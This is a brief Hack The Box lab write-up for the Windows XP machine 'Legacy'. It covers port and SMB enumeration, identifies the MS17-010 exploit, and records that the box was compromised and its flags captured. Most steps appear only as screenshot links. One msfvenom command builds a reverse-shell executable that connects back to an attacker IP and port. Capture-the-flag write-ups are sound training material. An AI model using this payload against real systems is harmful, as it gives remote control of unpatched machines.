# Legacy
> URL : https://app.hackthebox.eu/machines/2

IP : 10.10.10.4

## Info gathering
- nmap scan port
	- ![](https://i.imgur.com/XUUOml1.png)
- enum4linux check version
	- ![](https://i.imgur.com/94iDB0t.png)
- nmap check smb version
	- ![](https://i.imgur.com/USUyLZ0.png)
- So... we know that
	- Domain name : `HTB`
	- OS : `Windows XP`
	- Open Services : `SMB`
## Find Exploit
- Google
	- `XP SMB Exploit`
	- https://github.com/helviojunior/MS17-010
	- MS17-010
- Prepare reverse shell exe file
	- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7879 -f exe > shell_reverse_tcp`
- Run exploit
	- ![](https://i.imgur.com/C3wQcO3.png)
- Get reverse shell
	- ![](https://i.imgur.com/HYhpAYv.png)

## Flag
- Root Flag
	- ![](https://i.imgur.com/9eqbJAU.png)
- User Flag
	- ![](https://i.imgur.com/5db36Pf.png)
